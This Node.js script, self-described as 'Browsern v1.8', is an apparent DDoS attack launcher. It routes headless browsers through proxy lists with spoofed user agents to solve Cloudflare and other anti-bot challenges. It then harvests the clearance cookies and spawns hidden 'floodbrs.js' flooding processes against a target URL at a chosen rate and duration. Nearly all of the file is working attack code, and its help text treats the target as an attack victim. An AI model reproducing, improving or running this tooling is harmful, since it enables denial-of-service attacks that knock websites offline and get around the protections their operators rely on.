#!/usr/bin/env node
// Import Modules
const axios = require('axios');
const fs = require("fs")
const os = require('os');
const solver = require('./js');
const { exec } = require('child_process');
const { anonymizeProxy } = require('proxy-chain');
// Puppeteer
const { connect } = require('puppeteer-real-browser');

const sharedData = {
  startTime: ''
};

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const threads = process.argv[5]
const proxyFile = process.argv[6]
const args = process.argv.slice(7);

if (process.argv.includes('-h') || process.argv.includes('--help')) {
  console.log(`
Coded by @udpboy (Neerd) | Browsern v1.8
Usage: node browsern <host> <duration> <rates> <threads> <proxyfile> [options]

Arguments:
  <host>                Target host (e.g., https://example.com)
  <duration>            Attack duration (in seconds) [default: 120]
  <rates>               Requests rate per second [default: 2]
  <threads>             Number of threads [default: 1]
  <proxyfile>           Path to proxy list file (ip:port | ip:port:usn:pw format)

Options:
  --emulation <count>     Emulation wait time (seconds) (e.g., 1,2,5) [default: false]
  --dratelimit <value>    Enable ratelimit detection [default: false]
  --fingerprint <value>   Enable browser fingerprint [default: false]
  --anonymize <value>     Enable anonymize proxy [default: false]
  --ua <mode>             Enable browser userAgent (windows, android) [default: windows]
  --headless <mode>       Browser headless mode (auto, new, true/false) [default: false]
  --optimize <value>      Optimize browser settings [default: false]
  --browser <count>       Browser threads [default: 1]
  --cache <value>         Bypass cache for every request [default: false]
  -d, --debug <value>     Show debug information [default: true]
  -h, --help              Show help and usage instructions

Example:
  node browsern https://dstatlove.xyz/hit 300 12 2 proxies.txt --browser 12 --cache
  node browsern https://dstatlove.xyz/hit 300 8 2 proxies.txt --dratelimit --cache
  `);
  process.exit(0);
}

if (process.argv.length < 5) {
    console.error(`
Coded by @udpboy (Neerd) | Browsern v1.8
Browsern compatibility 2025-2026
Usage: node browsern <host> <duration> <rates> <threads> <proxyfile> [options]
       node browsern --help ( show help and usage inructions )
`);
    process.exit(1);
}

const getArgValue = (name) => {
  const index = args.indexOf(name);
  return index !== -1 && args[index + 1] && !args[index + 1].startsWith('--') ? args[index + 1] : null;
};
const getArgFlag = (name) => args.includes(name);

const emulationArg = getArgValue('--emulation');
const dratelimitArg = getArgFlag('--dratelimit');
const fingerprintArg = getArgValue('--fingerprint');
const anonymizeArg = getArgFlag('--anonymize');
const uaArg = getArgValue('--ua');
const headlessArg = getArgValue('--headless');
const optimizeArg = getArgFlag('--optimize');
const browsersArg = getArgValue('--browser');
const cacheArg = getArgFlag('--cache');
const debugArg = getArgFlag('--debug');
const debug2Arg = getArgFlag('-d');

const headlessModes = ['auto', 'legacy', 'new', 'shell', 'true', 'false'];
const uaModes = ['android', 'windows'];

if (headlessArg && !headlessModes.includes(headlessArg)) {
  console.error(`[INFO] Invalid headless mode: ${headlessArg}`);
  console.error(`[INFO] Valid modes: ${headlessModes.join(', ')}`);
  process.exit(1);
}

if (uaArg && !uaModes.includes(uaArg)) {
  console.error(`[INFO] Invalid userAgent mode: ${uaArg}`);
  console.error(`[INFO] Valid modes: ${uaModes.join(', ')}`);
  process.exit(1);
}

const emulation = emulationArg || false;
const dratelimit = dratelimitArg || false;
const fingerprint = fingerprintArg || false;
const anonymize = anonymizeArg || false;
const ua = uaArg || "android";
const headless = headlessArg || false;
const optimize = optimizeArg || false;
const browsers = browsersArg || 1;
const cache = cacheArg || false;
const debug = debugArg || debug2Arg || false;

function generateRandomString(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
function log(...args) {
  if (debug) {
    console.log(...args);
  }
}

const validkey = generateRandomString(5, 10);
//console.log(validkey);

/*const userAgentsAndroid = [
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
];*/

/*const userAgentsAndroid = [
  // Existing ones...
  'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 13; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Infinix Zero Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Tecno Phantom X2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; iQOO 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Lenovo Legion Y70) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Oppo Find X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; ZTE Nubia Z50 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Motorola Edge 20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Poco F5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Realme Narzo 60 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; Samsung Galaxy A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Honor Magic5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Meizu 20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Vivo V21 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Huawei Mate 50 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'
];*/

const userAgentsAndroid = [
  'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
  'Mozilla/5.0 (Linux; Android 13; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Infinix Zero Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Tecno Phantom X2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; iQOO 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Lenovo Legion Y70) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Oppo Find X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; ZTE Nubia Z50 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Motorola Edge 20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Poco F5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Realme Narzo 60 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; Samsung Galaxy A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Honor Magic5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Meizu 20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Vivo V21 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Huawei Mate 50 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Samsung Galaxy Z Fold5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Oppo Reno8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Vivo Y53s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Realme 11 Pro+) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Nokia X30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Tecno Camon 20 Premier) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; OnePlus Open) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Samsung Galaxy M32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; iQOO Z7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Infinix Note 30 VIP) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; Sony Xperia 1 II) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; ZTE Axon 40 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Asus Zenfone 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Poco X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Motorola Moto G82) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Vivo V29e) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Huawei Nova 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; LG Velvet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Realme GT5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'
];


const userAgentsWindows = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

async function handle_Cloudflare(page, browser, proxy) {
    const MAX_WAIT = 60000;
    const start = Date.now();
    while (true) {
        const title = await page.title();
        if (!title.includes('Just a moment...') && !title.startsWith('Failed to load URL')) return;
        if (title.startsWith('Failed to load URL')) return;
        if (Date.now() - start > MAX_WAIT) {
            console.log(`[INFO] Cloudflare Max wait 60s timeout, still challenge ${proxy}`);
            return;
        }
        await sleep(6);
    }
}
async function Browser(proxy) {
  let userAgent = '';
  let proxyserver = '';
  if (ua.includes('android')) {
    userAgent = userAgentsAndroid[Math.floor(Math.random() * userAgentsAndroid.length)];
  } else if (ua.includes('windows')) {
    userAgent = userAgentsWindows[Math.floor(Math.random() * userAgentsWindows.length)];
  }
  if (anonymize) {
    proxyserver = await anonymizeProxy(`http://${proxy}`);
  } else {
   proxyserver = `http://${proxy}`;
  }
//  console.log(proxyserver, ua)
  const { page, browser } = await connect({
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--disable-infobars',
      '--disable-blink-features=AutomationControlled',
      '--disable-background-timer-throttling',
      '--disable-renderer-backgrounding',
      '--disable-backgrounding-occluded-windows',
      '--disable-extensions',
      '--disable-default-apps',
      '--ignore-certificate-errors',
      '--ignore-certificate-errors-spki-list',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-background-mode',
      '--force-color-profile=srgb',
      '--enable-features=NetworkService,NetworkServiceInProcess',
      '--lang=en-US,en',
      '--tls-min-version=1.2',
      '--tls-max-version=1.3',
      "--user-agent=" + userAgent,
      "--proxy-server=" + proxyserver
    ],
    headless: true,
//    fingerprint: fingerprint,
    turnstile: true,
//    defaultViewport: { width: 1920, height: 1080 }
  });
  try {
    await page.setJavaScriptEnabled(true);
    await page.setDefaultNavigationTimeout(0);
    if (optimize) {
      await page.setRequestInterception(true);
      page.on('request', req => {
        if (['image', 'stylesheet', 'font'].includes(req.resourceType())) req.abort();
        else req.continue();
      });
    }
    const Browser = await page.goto(host, { waitUntil: 'domcontentloaded' });
//    log(`[OPTIONS] Emulation: ${emulation}, Fingerprint: ${fingerprint}, Headless: ${headless}, Optimize: ${optimize}`);
    const status = await Browser.status();
    const title = await page.title();
    log(`[INFO] Started browser - ${proxy} | Title: (${title}) | Status Code ${status}`);

    await sleep(0.8);
    const content = await page.content();
    if (emulation) {
      await sleep(emulation);
    }
    if (['Just a moment...', 'Checking your browser...', '安全检查中……'].includes(title)) {
      log(`[INFO] Detected protection ~ Cloudflare Challenge ${proxy}`);
      await handle_Cloudflare(page, browser, proxy);
    } else if (['Attention Required! | Cloudflare'].includes(title)) {
        log(`[WARN] Blocked by Cloudflare - ${proxy}\n[INFO] Closed Browser - ${proxy}`);
        await browser.close();
        return;

    } else {

     await sleep(0.8);
     await solver(page, content, title, sharedData, proxy, log);
//     await solver(page, content, title, proxy, log);
     await sleep(10);
    };

    const PageTitle = await page.title();
    const cookies = await page.cookies();
    const cookie = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();
//    log(proxy, cookie)
    await sleep(1)
    await browser.close();
    return {
      title: PageTitle,
//      headersall: HeadersBrowser,
      cookies: cookie,
      userAgent: userAgent,
      proxy: proxy,
    };
  } catch (err) {
//    console.log(`[WARN] Proxy error: ${proxy} | ${err.message}`);
    await browser.close()
    return;
  }
}

async function Start(host, proxy = null) {
  try {
      const response = await Browser(proxy);
      if (response) {
       if (['Just a moment...', 'Checking your browser...', '安全检查中……', 'Vercel Security Checkpoint', 'Just a moment please...', 'You are being redirected...', 'DDoS-Guard', 'CC LOCK'].includes(response.title)) {
         log(`[INFO] Closed browser - ${proxy}`);
         return;
       }
       if (response.cookies && response.cookies.length > 0) {
         log(`[INFO] Closed browser - ${response.proxy}\n[INFO] Page Title: ${response.title} | Proxy: ${response.proxy} | UserAgent: ${response.userAgent} | Cookie: ${response.cookies}`);
         if (proxyFile) {
           startFlood2({
              url: host,
              ip: response.proxy,
              ua: response.userAgent,
              cookie: response.cookies,
              time: duration,
              rate: rates,
              threads: threads
           });
         };
       } else {
        log(`[INFO] Closed browser - ${proxy}`);
       }
     }
  } catch (error) {
   return;
  }
}

function startFlood2({ url, ip, ua, cookie, time, rate, threads = 10 }) {
  const args = [
    'node floodbrs.js',
    url,
    String(time),
    String(threads),
    ip,
    String(rate),
    `"${cookie}"`,
    `"${ua}"`,
    validkey
  ].join(' ');

  const cmd = `screen -dm ${args}`;
//  console.log('[CMD]', cmd);
  exec(cmd);
}

//const { exec } = require('child_process');

function startFlood({ url, ip, ua, cookie, time, rate, threads = 10 }) {
  const args = [
    'floodbrs.js',
    url,
    String(time),
    String(threads),
    ip,
    String(rate),
    `"${cookie}"`,
    `"${ua}"`,
    validkey
  ].join(' ');

  const flooderProcess = exec(args, (error, stdout, stderr) => {
    if (error) {
      if (error.code === 1) {
        console.info("[INFO] Ratelimit Detect [429]");
      }
      // Bisa tambahin handle error lain kalau mau
      return;
    }

    // Output normal
    console.log(stdout);
  });

  // Opsional: jika mau tampilkan log saat proses selesai
  flooderProcess.on('close', (code) => {
    if (code === 1) {
      console.info("[INFO] Ratelimit Detected [429]");
    } else {
      console.info(`[INFO] Flood process exited with code ${code}`);
    }
  });
/*  const flooderProcess = spawn('node', args.split(' '), {
    stdio: ['ignore', 'pipe', 'pipe'],
  });

// Tampilkan stdout langsung (streaming)
  flooderProcess.stdout.on('data', (data) => {
    process.stdout.write(`[FLOODER] ${data}`);
  });

// Tampilkan stderr jika ada
  flooderProcess.stderr.on('data', (data) => {
    process.stderr.write(`[FLOODER-ERR] ${data}`);
  });

  flooderProcess.on('close', (code) => {
    if (code === 1) {
      console.info("[INFO] Ratelimit Detected [429]");
    } else {
      console.info(`[INFO] Flood process exited with code ${code}`);
    }
  });*/
}


const startTime = Date.now();


const proxyList = fs.readFileSync(proxyFile, 'utf-8')
  .split('\n')
   .map(p => p.trim())
  .filter(Boolean)
  .sort(() => Math.random() - 0.5);

const proxyQueue = proxyList.slice();

async function checkProxy(proxy) {
  try {
    const [host, port] = proxy.split(':');
    const response = await axios.get('http://httpbin.org/ip', {
      proxy: {
        host: host,
        port: parseInt(port),
      },
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      },
      timeout: 5000
    });
//    console.log(`[INFO] Proxy ${proxy} active`);
    return response.status === 200;
  } catch (error) {
//    console.log(`[INFO] Proxy ${proxy} is not active`);
    return false;
  }
}


async function threadWorker(threadId) {
  while (Date.now() - startTime < duration * 1000) {
    const proxy = proxyQueue.shift();
    if (!proxy) break;

    const isActive = await checkProxy(proxy);
    if (!isActive) continue;

//    console.log(`[Thread ${threadId}] Using proxy ${proxy}`);
    await Start(host, proxy);
  }
  console.log(`[Thread ${threadId}] finished`);
}

async function main() {
  const workers = [];
  for (let i = 0; i < browsers; i++) {
    workers.push(threadWorker(i + 1));
  }
  await Promise.all(workers);
  log('[INFO] All threads completed.');
}

main();

